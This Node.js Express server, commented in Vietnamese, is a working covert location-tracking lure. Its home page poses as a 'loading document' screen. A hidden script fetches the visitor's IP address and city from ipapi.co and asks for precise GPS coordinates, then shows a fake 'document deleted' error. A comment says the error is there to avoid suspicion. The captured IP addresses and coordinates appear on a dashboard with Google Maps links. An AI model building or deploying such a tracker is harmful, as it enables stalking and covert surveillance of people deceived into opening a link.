const express = require("express");
const app = express();

// Cấu hình để server đọc được dữ liệu JSON
app.use(express.json());

// Mảng tạm thời để lưu trữ danh sách người truy cập
let visitors = [];

// 1. Trang chủ: Giao diện "Đang tải tài liệu" kín đáo
app.get("/", (req, res) => {
    res.send(`
      <body style="font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: #f9f9f9; margin: 0;">
        <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
        <h2 style="color: #555; margin-top: 20px;">Đang tải tài liệu, vui lòng chờ...</h2>
        <p style="color: #888; font-size: 14px;">Hệ thống đang xác thực kết nối an toàn...</p>
        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>

        <script>
          // Chạy ngầm việc lấy dữ liệu IP và GPS
          fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(ipData => {
                const info = {
                    ip: ipData.ip,
                    city: ipData.city,
                    lat: ipData.latitude,
                    lon: ipData.longitude,
                    type: "IP Geolocation"
                };

                // Xin quyền lấy tọa độ GPS chính xác
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((position) => {
                        info.lat = position.coords.latitude;
                        info.lon = position.coords.longitude;
                        info.type = "GPS Precision";
                        sendData(info);
                    }, () => { sendData(info); }, { enableHighAccuracy: true });
                } else {
                    sendData(info);
                }
            });

          function sendData(data) {
            fetch('/api/visit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(() => {
                // Sau 3 giây báo lỗi giả để không bị nghi ngờ
                setTimeout(() => {
                    document.body.innerHTML = "<h3 style='color: #555;'>Lỗi: Tài liệu này không còn tồn tại hoặc đã bị xóa.</h3><a href='/'>Thử lại</a>";
                }, 3000);
            });
          }
        </script>
      </body>
    `);
});

// 2. API nhận dữ liệu từ trình duyệt gửi về
app.post("/api/visit", (req, res) => {
    const visitor = {
        ...req.body,
        time: new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" })
    };
    visitors.push(visitor);
    res.json({ status: "ok" });
});

// 3. Trang Dashboard để bạn xem danh sách
app.get("/dashboard", (req, res) => {
    let rows = visitors.map(v => `
      <tr>
        <td style="padding:10px; border:1px solid #ddd;">${v.ip}</td>
        <td style="padding:10px; border:1px solid #ddd;">
            <a href="https://www.google.com/maps?q=${v.lat},${v.lon}" target="_blank">${v.lat}, ${v.lon}</a>
        </td>
        <td style="padding:10px; border:1px solid #ddd;">${v.type}</td>
        <td style="padding:10px; border:1px solid #ddd;">${v.time}</td>
      </tr>`).reverse().join("");

    res.send(`
      <body style="font-family: sans-serif; padding: 20px;">
        <h3>Nhật ký truy cập (Click vào tọa độ để xem bản đồ)</h3>
        <table style="width:100%; border-collapse:collapse;">
          <tr style="background:#eee;">
            <th style="padding:10px; border:1px solid #ddd;">IP</th>
            <th style="padding:10px; border:1px solid #ddd;">Tọa độ</th>
            <th style="padding:10px; border:1px solid #ddd;">Độ chính xác</th>
            <th style="padding:10px; border:1px solid #ddd;">Thời gian</th>
          </tr>
          ${rows || '<tr><td colspan="4" style="text-align:center;">Chưa có dữ liệu</td></tr>'}
        </table>
        <br><a href="/">Quay lại trang chủ</a>
      </body>
    `);
});

// Khởi động Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server is running on port " + PORT));
